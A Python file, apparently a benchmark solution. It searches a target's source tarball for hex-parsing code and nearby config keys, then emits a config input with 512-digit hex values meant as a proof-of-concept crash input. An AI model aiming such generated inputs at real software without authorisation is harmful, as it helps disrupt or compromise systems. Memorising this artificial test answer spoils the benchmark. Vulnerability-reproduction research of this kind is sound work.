import os
import re
import tarfile

class Solution:
    def _read_member_text(self, tar, member, max_bytes=1024 * 1024):
        try:
            f = tar.extractfile(member)
            if not f:
                return ""
            data = f.read(max_bytes)
            try:
                return data.decode("utf-8", errors="ignore")
            except Exception:
                try:
                    return data.decode("latin-1", errors="ignore")
                except Exception:
                    return ""
        except Exception:
            return ""

    def _detect_hex_related_keys(self, src_path):
        # Search source files for hex-related parsing and nearby key names
        code_exts = {
            ".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".go", ".rs",
            ".m", ".mm"
        }
        likely_keys = set()
        try:
            with tarfile.open(src_path, "r:*") as tar:
                members = [m for m in tar.getmembers() if m.isfile()]
                for m in members:
                    name = m.name.lower()
                    _, ext = os.path.splitext(name)
                    if ext in code_exts:
                        text = self._read_member_text(tar, m)
                        if not text:
                            continue
                        # Find hex-related code patterns
                        for match in re.finditer(r'isxdigit\s*\(|strto[u]*l*l?\s*\([^,]+,[^,]*, *16\)|sscanf\s*\([^,]+,\s*"%\s*[xX]', text):
                            start = max(0, match.start() - 2000)
                            end = min(len(text), match.end() + 2000)
                            window = text[start:end]

                            # Extract candidate keys via string compares
                            for km in re.finditer(r'(?:strcmp|strcasecmp|strncmp|strncasecmp)\s*\(\s*[^,]+,\s*"([^"\n]{1,64})"', window):
                                s = km.group(1)
                                if not s:
                                    continue
                                # Filter out obviously non-keys
                                if any(tok in s.lower() for tok in ["%s", "%d", "%x", "usage", "error", "warning", "hex", "help"]):
                                    continue
                                # Keep likely config keys: shortish alnum, underscores, dashes
                                if re.fullmatch(r"[A-Za-z][A-Za-z0-9_\-\.]{0,31}", s):
                                    likely_keys.add(s)
                            # Also directly add "color" if seen in nearby strings
                            if re.search(r'"color"', window, re.IGNORECASE):
                                likely_keys.add("color")
                            if re.search(r'"foreground"|\"fg\"', window, re.IGNORECASE):
                                likely_keys.add("foreground")
                            if re.search(r'"background"|\"bg\"', window, re.IGNORECASE):
                                likely_keys.add("background")
                            if re.search(r'"address"|\"addr\"', window, re.IGNORECASE):
                                likely_keys.add("address")
                            if re.search(r'"mac"', window, re.IGNORECASE):
                                likely_keys.add("mac")
                            if re.search(r'"key"', window, re.IGNORECASE):
                                likely_keys.add("key")
                            if re.search(r'"token"', window, re.IGNORECASE):
                                likely_keys.add("token")
                            if re.search(r'"id"', window, re.IGNORECASE):
                                likely_keys.add("id")
                            if re.search(r'"guid"|\"uuid\"', window, re.IGNORECASE):
                                likely_keys.add("uuid")
                            if re.search(r'"salt"|\"secret\"', window, re.IGNORECASE):
                                likely_keys.add("salt")
        except Exception:
            pass

        # Rank keys by likelihood related to hex handling
        priority = [
            "color", "foreground", "background", "key", "token", "id",
            "uuid", "guid", "address", "addr", "mac", "salt", "secret",
            "hash", "mask", "serial"
        ]
        # Intersect with detected keys
        ranked = [k for k in priority if k in likely_keys]

        # If none detected, fallback to generic keys
        if not ranked:
            ranked = ["hex", "color", "key"]

        # Limit to a few keys to keep PoC concise
        return ranked[:3]

    def _gen_hex(self, n):
        base = "0123456789ABCDEF"
        full = (base * ((n // len(base)) + 1))[:n]
        return full

    def solve(self, src_path: str) -> bytes:
        keys = self._detect_hex_related_keys(src_path)

        # Construct PoC with long hex values; include both 0x and # for color-like keys
        # Keep each long value to 512 hex digits to be sizable but not enormous
        hex_len = 512

        lines = []
        # Add a simple recognizable header often accepted by many config parsers
        lines.append("[config]")

        for k in keys:
            val_hex = self._gen_hex(hex_len)
            # Primary line: key=0x....
            lines.append(f"{k}=0x{val_hex}")
            # If key seems color-like, also add a '#' prefixed variant
            if any(tag in k.lower() for tag in ("color", "foreground", "background", "fg", "bg")):
                lines.append(f"{k}=#{val_hex}")

        # Add a generic hex-only line as backup
        lines.append(f"hex=0x{self._gen_hex(hex_len)}")

        payload = ("\n".join(lines) + "\n").encode("ascii")
        return payload
